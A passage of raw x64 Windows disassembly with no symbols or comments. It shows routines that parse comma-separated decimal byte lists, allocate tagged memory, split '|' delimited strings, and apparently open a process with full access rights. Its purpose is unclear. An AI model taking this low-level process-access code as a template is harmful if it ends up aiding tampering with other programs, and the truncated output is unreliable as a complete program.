   140005e63:	e8 b0 0f 00 00       	call   0x140006e18
   140005e68:	48 8b c8             	mov    %rax,%rcx
   140005e6b:	48 8d 15 fe 19 00 00 	lea    0x19fe(%rip),%rdx        # 0x140007870
   140005e72:	48 ff c0             	inc    %rax
   140005e75:	45 8b c7             	mov    %r15d,%r8d
   140005e78:	48 89 05 f9 a7 00 00 	mov    %rax,0xa7f9(%rip)        # 0x140010678
   140005e7f:	e8 94 0f 00 00       	call   0x140006e18
   140005e84:	45 8b c7             	mov    %r15d,%r8d
   140005e87:	48 8d 15 f2 19 00 00 	lea    0x19f2(%rip),%rdx        # 0x140007880
   140005e8e:	48 8d 48 01          	lea    0x1(%rax),%rcx
   140005e92:	40 88 30             	mov    %sil,(%rax)
   140005e95:	e8 7e 0f 00 00       	call   0x140006e18
   140005e9a:	0f 28 05 ef 19 00 00 	movaps 0x19ef(%rip),%xmm0        # 0x140007890
   140005ea1:	49 8d 55 ff          	lea    -0x1(%r13),%rdx
   140005ea5:	0f 28 0d f4 19 00 00 	movaps 0x19f4(%rip),%xmm1        # 0x1400078a0
   140005eac:	48 8b d8             	mov    %rax,%rbx
   140005eaf:	0f b7 05 22 1a 00 00 	movzwl 0x1a22(%rip),%eax        # 0x1400078d8
   140005eb6:	0f 29 05 c3 ab 00 00 	movaps %xmm0,0xabc3(%rip)        # 0x140010a80
   140005ebd:	0f 28 05 ec 19 00 00 	movaps 0x19ec(%rip),%xmm0        # 0x1400078b0
   140005ec4:	0f 29 05 d5 ab 00 00 	movaps %xmm0,0xabd5(%rip)        # 0x140010aa0
   140005ecb:	f2 0f 10 05 fd 19 00 	movsd  0x19fd(%rip),%xmm0        # 0x1400078d0
   140005ed2:	00 
   140005ed3:	0f 29 0d b6 ab 00 00 	movaps %xmm1,0xabb6(%rip)        # 0x140010a90
   140005eda:	0f 28 0d df 19 00 00 	movaps 0x19df(%rip),%xmm1        # 0x1400078c0
   140005ee1:	66 89 05 e0 ab 00 00 	mov    %ax,0xabe0(%rip)        # 0x140010ac8
   140005ee8:	8a 05 ec 19 00 00    	mov    0x19ec(%rip),%al        # 0x1400078da
   140005eee:	f2 0f 11 05 ca ab 00 	movsd  %xmm0,0xabca(%rip)        # 0x140010ac0
   140005ef5:	00 
   140005ef6:	0f 29 0d b3 ab 00 00 	movaps %xmm1,0xabb3(%rip)        # 0x140010ab0
   140005efd:	88 05 c7 ab 00 00    	mov    %al,0xabc7(%rip)        # 0x140010aca
   140005f03:	48 ff c2             	inc    %rdx
   140005f06:	40 38 32             	cmp    %sil,(%rdx)
   140005f09:	75 f8                	jne    0x140005f03
   140005f0b:	48 8b 3d 66 a7 00 00 	mov    0xa766(%rip),%rdi        # 0x140010678
   140005f12:	33 c9                	xor    %ecx,%ecx
   140005f14:	8a 04 0f             	mov    (%rdi,%rcx,1),%al
   140005f17:	88 04 0a             	mov    %al,(%rdx,%rcx,1)
   140005f1a:	48 ff c1             	inc    %rcx
   140005f1d:	84 c0                	test   %al,%al
   140005f1f:	75 f3                	jne    0x140005f14
   140005f21:	48 83 cf ff          	or     $0xffffffffffffffff,%rdi
   140005f25:	4c 89 6c 24 28       	mov    %r13,0x28(%rsp)
   140005f2a:	48 8b c7             	mov    %rdi,%rax
   140005f2d:	48 ff c0             	inc    %rax
   140005f30:	42 38 34 28          	cmp    %sil,(%rax,%r13,1)
   140005f34:	75 f7                	jne    0x140005f2d
   140005f36:	48 8d 15 43 ad 00 00 	lea    0xad43(%rip),%rdx        # 0x140010c80
   140005f3d:	66 89 44 24 22       	mov    %ax,0x22(%rsp)
   140005f42:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140005f47:	66 89 44 24 20       	mov    %ax,0x20(%rsp)
   140005f4c:	e8 a3 05 00 00       	call   0x1400064f4
   140005f51:	48 8b 0d 20 a7 00 00 	mov    0xa720(%rip),%rcx        # 0x140010678
   140005f58:	48 8b c7             	mov    %rdi,%rax
   140005f5b:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   140005f60:	48 ff c0             	inc    %rax
   140005f63:	40 38 34 01          	cmp    %sil,(%rcx,%rax,1)
   140005f67:	75 f7                	jne    0x140005f60
   140005f69:	66 89 44 24 22       	mov    %ax,0x22(%rsp)
   140005f6e:	48 8b 05 03 a7 00 00 	mov    0xa703(%rip),%rax        # 0x140010678
   140005f75:	48 ff c7             	inc    %rdi
   140005f78:	40 38 34 38          	cmp    %sil,(%rax,%rdi,1)
   140005f7c:	75 f7                	jne    0x140005f75
   140005f7e:	48 8d 15 fb a6 00 00 	lea    0xa6fb(%rip),%rdx        # 0x140010680
   140005f85:	66 89 7c 24 20       	mov    %di,0x20(%rsp)
   140005f8a:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140005f8f:	e8 60 05 00 00       	call   0x1400064f4
   140005f94:	48 8d 43 01          	lea    0x1(%rbx),%rax
   140005f98:	48 89 05 c9 a6 00 00 	mov    %rax,0xa6c9(%rip)        # 0x140010668
   140005f9f:	eb 11                	jmp    0x140005fb2
   140005fa1:	84 c0                	test   %al,%al
   140005fa3:	74 13                	je     0x140005fb8
   140005fa5:	3c 2c                	cmp    $0x2c,%al
   140005fa7:	75 06                	jne    0x140005faf
   140005fa9:	ff 05 c1 a6 00 00    	incl   0xa6c1(%rip)        # 0x140010670
   140005faf:	48 ff c3             	inc    %rbx
   140005fb2:	8a 03                	mov    (%rbx),%al
   140005fb4:	3c 7d                	cmp    $0x7d,%al
   140005fb6:	75 e9                	jne    0x140005fa1
   140005fb8:	8b 05 b2 a6 00 00    	mov    0xa6b2(%rip),%eax        # 0x140010670
   140005fbe:	85 c0                	test   %eax,%eax
   140005fc0:	74 08                	je     0x140005fca
   140005fc2:	ff c0                	inc    %eax
   140005fc4:	89 05 a6 a6 00 00    	mov    %eax,0xa6a6(%rip)        # 0x140010670
   140005fca:	48 8b 1d 97 a6 00 00 	mov    0xa697(%rip),%rbx        # 0x140010668
   140005fd1:	b9 01 00 00 00       	mov    $0x1,%ecx
   140005fd6:	8b d0                	mov    %eax,%edx
   140005fd8:	41 b8 57 45 4e 45    	mov    $0x454e4557,%r8d
   140005fde:	ff 15 2c 23 00 00    	call   *0x232c(%rip)        # 0x140008310
   140005fe4:	48 89 05 7d a6 00 00 	mov    %rax,0xa67d(%rip)        # 0x140010668
   140005feb:	48 85 c0             	test   %rax,%rax
   140005fee:	75 1d                	jne    0x14000600d
   140005ff0:	48 8b 3d 69 a6 00 00 	mov    0xa669(%rip),%rdi        # 0x140010660
   140005ff7:	49 8b cf             	mov    %r15,%rcx
   140005ffa:	48 21 35 77 a6 00 00 	and    %rsi,0xa677(%rip)        # 0x140010678
   140006001:	f3 aa                	rep stos %al,(%rdi)
   140006003:	49 8b fd             	mov    %r13,%rdi
   140006006:	8d 48 08             	lea    0x8(%rax),%ecx
   140006009:	f3 aa                	rep stos %al,(%rdi)
   14000600b:	eb 60                	jmp    0x14000606d
   14000600d:	8b 0d 5d a6 00 00    	mov    0xa65d(%rip),%ecx        # 0x140010670
   140006013:	48 8b f8             	mov    %rax,%rdi
   140006016:	33 c0                	xor    %eax,%eax
   140006018:	f3 aa                	rep stos %al,(%rdi)
   14000601a:	40 8a 3b             	mov    (%rbx),%dil
   14000601d:	40 80 ff 7d          	cmp    $0x7d,%dil
   140006021:	74 44                	je     0x140006067
   140006023:	45 33 c0             	xor    %r8d,%r8d
   140006026:	40 84 ff             	test   %dil,%dil
   140006029:	74 3c                	je     0x140006067
   14000602b:	41 3b f7             	cmp    %r15d,%esi
   14000602e:	73 37                	jae    0x140006067
   140006030:	40 80 ff 2c          	cmp    $0x2c,%dil
   140006034:	74 20                	je     0x140006056
   140006036:	48 8b 15 2b a6 00 00 	mov    0xa62b(%rip),%rdx        # 0x140010668
   14000603d:	41 8a 0c 10          	mov    (%r8,%rdx,1),%cl
   140006041:	8a c1                	mov    %cl,%al
   140006043:	c0 e0 02             	shl    $0x2,%al
   140006046:	02 c8                	add    %al,%cl
   140006048:	02 c9                	add    %cl,%cl
   14000604a:	80 e9 30             	sub    $0x30,%cl
   14000604d:	40 02 cf             	add    %dil,%cl
   140006050:	41 88 0c 10          	mov    %cl,(%r8,%rdx,1)
   140006054:	eb 05                	jmp    0x14000605b
   140006056:	ff c6                	inc    %esi
   140006058:	49 ff c0             	inc    %r8
   14000605b:	48 ff c3             	inc    %rbx
   14000605e:	40 8a 3b             	mov    (%rbx),%dil
   140006061:	40 80 ff 7d          	cmp    $0x7d,%dil
   140006065:	75 bf                	jne    0x140006026
   140006067:	b0 01                	mov    $0x1,%al
   140006069:	eb 02                	jmp    0x14000606d
   14000606b:	32 c0                	xor    %al,%al
   14000606d:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140006072:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   140006077:	48 8b 7c 24 50       	mov    0x50(%rsp),%rdi
   14000607c:	4c 8b 6c 24 58       	mov    0x58(%rsp),%r13
   140006081:	48 83 c4 30          	add    $0x30,%rsp
   140006085:	41 5f                	pop    %r15
   140006087:	c3                   	ret
   140006088:	48 89 6c 24 08       	mov    %rbp,0x8(%rsp)
   14000608d:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140006092:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   140006097:	41 56                	push   %r14
   140006099:	48 83 ec 20          	sub    $0x20,%rsp
   14000609d:	4c 8b 0d fc c1 00 00 	mov    0xc1fc(%rip),%r9        # 0x1400122a0
   1400060a4:	4d 85 c9             	test   %r9,%r9
   1400060a7:	0f 84 b1 00 00 00    	je     0x14000615e
   1400060ad:	33 c0                	xor    %eax,%eax
   1400060af:	48 8d 3d ca af 00 00 	lea    0xafca(%rip),%rdi        # 0x140011080
   1400060b6:	bd 00 02 00 00       	mov    $0x200,%ebp
   1400060bb:	4c 8d 35 de b7 00 00 	lea    0xb7de(%rip),%r14        # 0x1400118a0
   1400060c2:	be 00 08 00 00       	mov    $0x800,%esi
   1400060c7:	48 8d 15 b2 af 00 00 	lea    0xafb2(%rip),%rdx        # 0x140011080
   1400060ce:	8b ce                	mov    %esi,%ecx
   1400060d0:	44 8b c6             	mov    %esi,%r8d
   1400060d3:	f3 aa                	rep stos %al,(%rdi)
   1400060d5:	49 8b fe             	mov    %r14,%rdi
   1400060d8:	8b cd                	mov    %ebp,%ecx
   1400060da:	f3 aa                	rep stos %al,(%rdi)
   1400060dc:	48 8d 3d bd b9 00 00 	lea    0xb9bd(%rip),%rdi        # 0x140011aa0
   1400060e3:	8b cd                	mov    %ebp,%ecx
   1400060e5:	f3 aa                	rep stos %al,(%rdi)
   1400060e7:	48 8d 3d b2 bb 00 00 	lea    0xbbb2(%rip),%rdi        # 0x140011ca0
   1400060ee:	8b cd                	mov    %ebp,%ecx
   1400060f0:	f3 aa                	rep stos %al,(%rdi)
   1400060f2:	49 8b c9             	mov    %r9,%rcx
   1400060f5:	e8 7e c7 ff ff       	call   0x140002878
   1400060fa:	84 c0                	test   %al,%al
   1400060fc:	74 60                	je     0x14000615e
   1400060fe:	48 8b 15 03 3f 00 00 	mov    0x3f03(%rip),%rdx        # 0x14000a008
   140006105:	48 8d 0d 74 af 00 00 	lea    0xaf74(%rip),%rcx        # 0x140011080
   14000610c:	41 b8 1e 00 00 00    	mov    $0x1e,%r8d
   140006112:	e8 01 0d 00 00       	call   0x140006e18
   140006117:	48 85 c0             	test   %rax,%rax
   14000611a:	74 42                	je     0x14000615e
   14000611c:	8b d6                	mov    %esi,%edx
   14000611e:	48 8d 0d 5b af 00 00 	lea    0xaf5b(%rip),%rcx        # 0x140011080
   140006125:	e8 06 c4 ff ff       	call   0x140002530
   14000612a:	48 85 c0             	test   %rax,%rax
   14000612d:	74 2f                	je     0x14000615e
   14000612f:	8a 10                	mov    (%rax),%dl
   140006131:	84 d2                	test   %dl,%dl
   140006133:	74 25                	je     0x14000615a
   140006135:	33 ff                	xor    %edi,%edi
   140006137:	45 33 c0             	xor    %r8d,%r8d
   14000613a:	80 fa 7c             	cmp    $0x7c,%dl
   14000613d:	75 07                	jne    0x140006146
   14000613f:	4c 03 c5             	add    %rbp,%r8
   140006142:	33 ff                	xor    %edi,%edi
   140006144:	eb 0b                	jmp    0x140006151
   140006146:	49 8d 0c 38          	lea    (%r8,%rdi,1),%rcx
   14000614a:	48 ff c7             	inc    %rdi
   14000614d:	42 88 14 31          	mov    %dl,(%rcx,%r14,1)
   140006151:	48 ff c0             	inc    %rax
   140006154:	8a 10                	mov    (%rax),%dl
   140006156:	84 d2                	test   %dl,%dl
   140006158:	75 e0                	jne    0x14000613a
   14000615a:	b0 01                	mov    $0x1,%al
   14000615c:	eb 02                	jmp    0x140006160
   14000615e:	32 c0                	xor    %al,%al
   140006160:	48 8b 6c 24 30       	mov    0x30(%rsp),%rbp
   140006165:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   14000616a:	48 8b 7c 24 40       	mov    0x40(%rsp),%rdi
   14000616f:	48 83 c4 20          	add    $0x20,%rsp
   140006173:	41 5e                	pop    %r14
   140006175:	c3                   	ret
   140006176:	cc                   	int3
   140006177:	cc                   	int3
   140006178:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000617d:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140006182:	57                   	push   %rdi
   140006183:	48 81 ec 30 01 00 00 	sub    $0x130,%rsp
   14000618a:	48 8b 05 4f 3f 00 00 	mov    0x3f4f(%rip),%rax        # 0x14000a0e0
   140006191:	48 33 c4             	xor    %rsp,%rax
   140006194:	48 89 84 24 20 01 00 	mov    %rax,0x120(%rsp)
   14000619b:	00 
   14000619c:	33 d2                	xor    %edx,%edx
   14000619e:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400061a3:	41 b8 00 01 00 00    	mov    $0x100,%r8d
   1400061a9:	e8 92 0f 00 00       	call   0x140007140
   1400061ae:	48 83 3d ea c0 00 00 	cmpq   $0x0,0xc0ea(%rip)        # 0x1400122a0
   1400061b5:	00 
   1400061b6:	0f 84 a2 00 00 00    	je     0x14000625e
   1400061bc:	80 3d dd ba 00 00 00 	cmpb   $0x0,0xbadd(%rip)        # 0x140011ca0
   1400061c3:	0f 84 95 00 00 00    	je     0x14000625e
   1400061c9:	4c 8d 0d b0 b6 00 00 	lea    0xb6b0(%rip),%r9        # 0x140011880
   1400061d0:	4c 8d 05 c9 ba 00 00 	lea    0xbac9(%rip),%r8        # 0x140011ca0
   1400061d7:	48 8d 15 52 16 00 00 	lea    0x1652(%rip),%rdx        # 0x140007830
   1400061de:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400061e3:	e8 fa 0d 00 00       	call   0x140006fe2
   1400061e8:	48 8d 1d 91 ae 00 00 	lea    0xae91(%rip),%rbx        # 0x140011080
   1400061ef:	be 00 08 00 00       	mov    $0x800,%esi
   1400061f4:	33 c0                	xor    %eax,%eax
   1400061f6:	48 8b fb             	mov    %rbx,%rdi
   1400061f9:	8b ce                	mov    %esi,%ecx
   1400061fb:	44 8b c6             	mov    %esi,%r8d
   1400061fe:	f3 aa                	rep stos %al,(%rdi)
   140006200:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140006205:	48 8b d3             	mov    %rbx,%rdx
   140006208:	e8 6b c6 ff ff       	call   0x140002878
   14000620d:	84 c0                	test   %al,%al
   14000620f:	74 4d                	je     0x14000625e
   140006211:	48 8b 15 f0 3d 00 00 	mov    0x3df0(%rip),%rdx        # 0x14000a008
   140006218:	41 b8 1e 00 00 00    	mov    $0x1e,%r8d
   14000621e:	48 8b cb             	mov    %rbx,%rcx
   140006221:	e8 f2 0b 00 00       	call   0x140006e18
   140006226:	48 85 c0             	test   %rax,%rax
   140006229:	74 33                	je     0x14000625e
   14000622b:	8b d6                	mov    %esi,%edx
   14000622d:	48 8b cb             	mov    %rbx,%rcx
   140006230:	e8 fb c2 ff ff       	call   0x140002530
   140006235:	48 85 c0             	test   %rax,%rax
   140006238:	74 24                	je     0x14000625e
   14000623a:	44 8b c6             	mov    %esi,%r8d
   14000623d:	48 8d 15 fc 15 00 00 	lea    0x15fc(%rip),%rdx        # 0x140007840
   140006244:	48 8b c8             	mov    %rax,%rcx
   140006247:	e8 cc 0b 00 00       	call   0x140006e18
   14000624c:	48 85 c0             	test   %rax,%rax
   14000624f:	74 0d                	je     0x14000625e
   140006251:	33 c0                	xor    %eax,%eax
   140006253:	48 8b fb             	mov    %rbx,%rdi
   140006256:	8b ce                	mov    %esi,%ecx
   140006258:	f3 aa                	rep stos %al,(%rdi)
   14000625a:	b0 01                	mov    $0x1,%al
   14000625c:	eb 02                	jmp    0x140006260
   14000625e:	32 c0                	xor    %al,%al
   140006260:	48 8b 8c 24 20 01 00 	mov    0x120(%rsp),%rcx
   140006267:	00 
   140006268:	48 33 cc             	xor    %rsp,%rcx
   14000626b:	e8 c0 0d 00 00       	call   0x140007030
   140006270:	4c 8d 9c 24 30 01 00 	lea    0x130(%rsp),%r11
   140006277:	00 
   140006278:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   14000627c:	49 8b 73 18          	mov    0x18(%r11),%rsi
   140006280:	49 8b e3             	mov    %r11,%rsp
   140006283:	5f                   	pop    %rdi
   140006284:	c3                   	ret
   140006285:	cc                   	int3
   140006286:	cc                   	int3
   140006287:	cc                   	int3
   140006288:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   14000628d:	55                   	push   %rbp
   14000628e:	56                   	push   %rsi
   14000628f:	57                   	push   %rdi
   140006290:	41 56                	push   %r14
   140006292:	41 57                	push   %r15
   140006294:	48 8d ac 24 b0 fe ff 	lea    -0x150(%rsp),%rbp
   14000629b:	ff 
   14000629c:	48 81 ec 50 02 00 00 	sub    $0x250,%rsp
   1400062a3:	48 8b 05 36 3e 00 00 	mov    0x3e36(%rip),%rax        # 0x14000a0e0
   1400062aa:	48 33 c4             	xor    %rsp,%rax
   1400062ad:	48 89 85 40 01 00 00 	mov    %rax,0x140(%rbp)
   1400062b4:	4c 8b f2             	mov    %rdx,%r14
   1400062b7:	4c 8b f9             	mov    %rcx,%r15
   1400062ba:	be 00 02 00 00       	mov    $0x200,%esi
   1400062bf:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400062c4:	44 8b c6             	mov    %esi,%r8d
   1400062c7:	33 d2                	xor    %edx,%edx
   1400062c9:	e8 72 0e 00 00       	call   0x140007140
   1400062ce:	33 c0                	xor    %eax,%eax
   1400062d0:	33 ff                	xor    %edi,%edi
   1400062d2:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400062d5:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   1400062da:	0f 11 44 24 20       	movups %xmm0,0x20(%rsp)
   1400062df:	41 38 3e             	cmp    %dil,(%r14)
   1400062e2:	0f 84 87 01 00 00    	je     0x14000646f
   1400062e8:	48 39 3d b1 bf 00 00 	cmp    %rdi,0xbfb1(%rip)        # 0x1400122a0
   1400062ef:	0f 84 7a 01 00 00    	je     0x14000646f
   1400062f5:	40 38 3d a4 bd 00 00 	cmp    %dil,0xbda4(%rip)        # 0x1400120a0
   1400062fc:	0f 84 6d 01 00 00    	je     0x14000646f
   140006302:	44 8b c6             	mov    %esi,%r8d
   140006305:	48 8d 15 94 bd 00 00 	lea    0xbd94(%rip),%rdx        # 0x1400120a0
   14000630c:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140006311:	e8 de 0c 00 00       	call   0x140006ff4
   140006316:	48 83 cb ff          	or     $0xffffffffffffffff,%rbx
   14000631a:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   14000631f:	48 8b c3             	mov    %rbx,%rax
   140006322:	48 ff c0             	inc    %rax
   140006325:	40 38 3c 01          	cmp    %dil,(%rcx,%rax,1)
   140006329:	75 f7                	jne    0x140006322
   14000632b:	4c 8b c6             	mov    %rsi,%r8
   14000632e:	48 8d 15 bb 15 00 00 	lea    0x15bb(%rip),%rdx        # 0x1400078f0
   140006335:	4c 2b c0             	sub    %rax,%r8
   140006338:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   14000633d:	e8 88 0c 00 00       	call   0x140006fca
   140006342:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140006347:	48 8b c3             	mov    %rbx,%rax
   14000634a:	48 ff c0             	inc    %rax
   14000634d:	40 38 3c 01          	cmp    %dil,(%rcx,%rax,1)
   140006351:	75 f7                	jne    0x14000634a
   140006353:	48 8b 15 76 3d 00 00 	mov    0x3d76(%rip),%rdx        # 0x14000a0d0
   14000635a:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   14000635f:	4c 8b c6             	mov    %rsi,%r8
   140006362:	4c 2b c0             	sub    %rax,%r8
   140006365:	e8 60 0c 00 00       	call   0x140006fca
   14000636a:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   14000636f:	48 8b c3             	mov    %rbx,%rax
   140006372:	48 ff c0             	inc    %rax
   140006375:	40 38 3c 01          	cmp    %dil,(%rcx,%rax,1)
   140006379:	75 f7                	jne    0x140006372
   14000637b:	4c 8b c6             	mov    %rsi,%r8
   14000637e:	48 8d 15 7b 15 00 00 	lea    0x157b(%rip),%rdx        # 0x140007900
   140006385:	4c 2b c0             	sub    %rax,%r8
   140006388:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   14000638d:	e8 38 0c 00 00       	call   0x140006fca
   140006392:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   140006397:	48 ff c3             	inc    %rbx
   14000639a:	40 38 3c 18          	cmp    %dil,(%rax,%rbx,1)
   14000639e:	75 f7                	jne    0x140006397
   1400063a0:	48 2b f3             	sub    %rbx,%rsi
   1400063a3:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400063a8:	4c 8b c6             	mov    %rsi,%r8
   1400063ab:	49 8b d6             	mov    %r14,%rdx
   1400063ae:	e8 17 0c 00 00       	call   0x140006fca
   1400063b3:	ba 00 08 00 00       	mov    $0x800,%edx
   1400063b8:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400063bd:	e8 a2 d1 ff ff       	call   0x140003564
   1400063c2:	84 c0                	test   %al,%al
   1400063c4:	0f 84 a5 00 00 00    	je     0x14000646f
   1400063ca:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   1400063cf:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400063d4:	e8 9b c1 ff ff       	call   0x140002574
   1400063d9:	84 c0                	test   %al,%al
   1400063db:	0f 84 8e 00 00 00    	je     0x14000646f
   1400063e1:	48 8b 35 20 3c 00 00 	mov    0x3c20(%rip),%rsi        # 0x14000a008
   1400063e8:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400063ed:	e8 12 d2 ff ff       	call   0x140003604
   1400063f2:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400063f7:	48 8b d8             	mov    %rax,%rbx
   1400063fa:	e8 05 d1 ff ff       	call   0x140003504
   1400063ff:	48 83 fb 1e          	cmp    $0x1e,%rbx
   140006403:	76 6a                	jbe    0x14000646f
   140006405:	41 b8 1e 00 00 00    	mov    $0x1e,%r8d
   14000640b:	48 8b d6             	mov    %rsi,%rdx
   14000640e:	48 8b c8             	mov    %rax,%rcx
   140006411:	e8 02 0a 00 00       	call   0x140006e18
   140006416:	48 85 c0             	test   %rax,%rax
   140006419:	74 54                	je     0x14000646f
   14000641b:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140006420:	e8 df d1 ff ff       	call   0x140003604
   140006425:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000642a:	48 8b d8             	mov    %rax,%rbx
   14000642d:	e8 d2 d0 ff ff       	call   0x140003504
   140006432:	48 8b c8             	mov    %rax,%rcx
   140006435:	48 8b d3             	mov    %rbx,%rdx
   140006438:	e8 f3 c0 ff ff       	call   0x140002530
   14000643d:	48 8b d8             	mov    %rax,%rbx
   140006440:	48 85 c0             	test   %rax,%rax
   140006443:	74 2a                	je     0x14000646f
   140006445:	48 8d 15 c4 14 00 00 	lea    0x14c4(%rip),%rdx        # 0x140007910
   14000644c:	48 8b c8             	mov    %rax,%rcx
   14000644f:	e8 82 0b 00 00       	call   0x140006fd6
   140006454:	48 85 c0             	test   %rax,%rax
   140006457:	74 13                	je     0x14000646c
   140006459:	41 b8 ff 00 00 00    	mov    $0xff,%r8d
   14000645f:	48 8b d3             	mov    %rbx,%rdx
   140006462:	49 8b cf             	mov    %r15,%rcx
   140006465:	e8 8a 0b 00 00       	call   0x140006ff4
   14000646a:	eb 03                	jmp    0x14000646f
   14000646c:	40 b7 01             	mov    $0x1,%dil
   14000646f:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140006474:	e8 bb d0 ff ff       	call   0x140003534
   140006479:	40 8a c7             	mov    %dil,%al
   14000647c:	48 8b 8d 40 01 00 00 	mov    0x140(%rbp),%rcx
   140006483:	48 33 cc             	xor    %rsp,%rcx
   140006486:	e8 a5 0b 00 00       	call   0x140007030
   14000648b:	48 8b 9c 24 90 02 00 	mov    0x290(%rsp),%rbx
   140006492:	00 
   140006493:	48 81 c4 50 02 00 00 	add    $0x250,%rsp
   14000649a:	41 5f                	pop    %r15
   14000649c:	41 5e                	pop    %r14
   14000649e:	5f                   	pop    %rdi
   14000649f:	5e                   	pop    %rsi
   1400064a0:	5d                   	pop    %rbp
   1400064a1:	c3                   	ret
   1400064a2:	cc                   	int3
   1400064a3:	cc                   	int3
   1400064a4:	48 83 ec 38          	sub    $0x38,%rsp
   1400064a8:	80 3d d1 a5 00 00 00 	cmpb   $0x0,0xa5d1(%rip)        # 0x140010a80
   1400064af:	74 3b                	je     0x1400064ec
   1400064b1:	e8 c2 f2 ff ff       	call   0x140005778
   1400064b6:	84 c0                	test   %al,%al
   1400064b8:	75 2e                	jne    0x1400064e8
   1400064ba:	8b 05 b0 a1 00 00    	mov    0xa1b0(%rip),%eax        # 0x140010670
   1400064c0:	48 8d 15 19 14 00 00 	lea    0x1419(%rip),%rdx        # 0x1400078e0
   1400064c7:	4c 8b 0d 9a a1 00 00 	mov    0xa19a(%rip),%r9        # 0x140010668
   1400064ce:	48 8d 0d ab a7 00 00 	lea    0xa7ab(%rip),%rcx        # 0x140010c80
   1400064d5:	41 b8 03 00 00 00    	mov    $0x3,%r8d
   1400064db:	89 44 24 20          	mov    %eax,0x20(%rsp)
   1400064df:	e8 a8 08 00 00       	call   0x140006d8c
   1400064e4:	85 c0                	test   %eax,%eax
   1400064e6:	74 04                	je     0x1400064ec
   1400064e8:	b0 01                	mov    $0x1,%al
   1400064ea:	eb 02                	jmp    0x1400064ee
   1400064ec:	32 c0                	xor    %al,%al
   1400064ee:	48 83 c4 38          	add    $0x38,%rsp
   1400064f2:	c3                   	ret
   1400064f3:	cc                   	int3
   1400064f4:	40 53                	rex push %rbx
   1400064f6:	48 83 ec 30          	sub    $0x30,%rsp
   1400064fa:	48 8b da             	mov    %rdx,%rbx
   1400064fd:	0f 57 c0             	xorps  %xmm0,%xmm0
   140006500:	48 8b d1             	mov    %rcx,%rdx
   140006503:	41 b0 01             	mov    $0x1,%r8b
   140006506:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000650b:	0f 11 44 24 20       	movups %xmm0,0x20(%rsp)
   140006510:	ff 15 22 1e 00 00    	call   *0x1e22(%rip)        # 0x140008338
   140006516:	85 c0                	test   %eax,%eax
   140006518:	78 28                	js     0x140006542
   14000651a:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   14000651f:	48 85 c9             	test   %rcx,%rcx
   140006522:	74 1e                	je     0x140006542
   140006524:	48 2b d9             	sub    %rcx,%rbx
   140006527:	0f b7 01             	movzwl (%rcx),%eax
   14000652a:	66 89 04 0b          	mov    %ax,(%rbx,%rcx,1)
   14000652e:	48 8d 49 02          	lea    0x2(%rcx),%rcx
   140006532:	66 85 c0             	test   %ax,%ax
   140006535:	75 f0                	jne    0x140006527
   140006537:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000653c:	ff 15 de 1d 00 00    	call   *0x1dde(%rip)        # 0x140008320
   140006542:	48 83 c4 30          	add    $0x30,%rsp
   140006546:	5b                   	pop    %rbx
   140006547:	c3                   	ret
   140006548:	48 83 ec 48          	sub    $0x48,%rsp
   14000654c:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   140006552:	45 33 c9             	xor    %r9d,%r9d
   140006555:	48 89 54 24 28       	mov    %rdx,0x28(%rsp)
   14000655a:	45 33 c0             	xor    %r8d,%r8d
   14000655d:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   140006563:	ba ff ff 1f 00       	mov    $0x1fffff,%edx
   140006568:	ff 15 fa 1c 00 00    	call   *0x1cfa(%rip)        # 0x140008268
   14000656e:	85 c0                	test   %eax,%eax
   140006570:	0f 99 c0             	setns  %al
   140006573:	48 83 c4 48          	add    $0x48,%rsp
   140006577:	c3                   	ret
   140006578:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000657d:	48 89 7c 24 10       	mov    %rdi,0x10(%rsp)
   140006582:	33 ff                	xor    %edi,%edi
   140006584:	4d 8b d8             	mov    %r8,%r11
   140006587:	44 8b d2             	mov    %edx,%r10d
   14000658a:	4c 8b c9             	mov    %rcx,%r9
   14000658d:	48 85 c9             	test   %rcx,%rcx
   140006590:	74 55                	je     0x1400065e7
   140006592:	4d 85 c0             	test   %r8,%r8
   140006595:	74 50                	je     0x1400065e7
   140006597:	66 41 39 38          	cmp    %di,(%r8)
   14000659b:	74 4a                	je     0x1400065e7
   14000659d:	85 d2                	test   %edx,%edx
   14000659f:	7e 46                	jle    0x1400065e7
